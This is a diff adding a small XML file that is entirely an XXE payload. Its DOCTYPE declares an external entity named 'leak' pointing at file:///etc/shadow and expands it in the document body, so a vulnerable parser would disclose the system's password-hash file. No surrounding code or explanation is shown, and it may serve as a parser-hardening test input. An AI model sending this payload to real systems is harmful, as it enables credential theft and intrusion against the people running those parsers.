@@ -1,0 +1,9 @@
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY
+      leak
+      SYSTEM
+      "file:///etc/shadow"
+  >
+]>
+<data>&leak;</data>
